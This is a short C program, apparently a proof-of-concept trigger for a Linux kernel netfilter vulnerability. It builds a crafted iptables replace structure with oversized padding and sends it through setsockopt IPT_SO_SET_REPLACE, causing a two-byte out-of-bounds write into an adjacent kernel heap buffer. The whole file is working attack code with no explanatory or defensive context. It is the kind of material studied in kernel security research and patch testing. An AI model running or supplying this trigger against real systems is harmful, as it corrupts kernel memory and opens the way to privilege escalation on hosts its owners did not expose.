#include <stdio.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <linux/netfilter_ipv4/ip_tables.h>

#define PRIMARY_SIZE 0x1000

void trigger_oob_write(int s)
{
    struct __attribute__((__packed__)) {
        struct ipt_replace replace;
        struct ipt_entry entry;
        struct xt_entry_match match;
        char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
        struct xt_entry_target target;
    } data = {0};

    data.replace.num_counters = 1;
    data.replace.num_entries = 1;
    data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
                        sizeof(data.pad) + sizeof(data.target));

    data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
                                sizeof(data.pad) + sizeof(data.target));
    data.entry.target_offset =
        (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));

    data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));
    strcpy(data.match.u.user.name, "icmp");
    data.match.u.user.revision = 0;

    data.target.u.user.target_size = sizeof(data.target);
    strcpy(data.target.u.user.name, "NFQUEUE");
    data.target.u.user.revision = 1;

    // Partially overwrite the adjacent buffer with 2 bytes of zero.
    if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
        perror("setsockopt");
    }
}

int main()
{
    int s;
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
    }
    trigger_oob_write(s);
    return 0;
}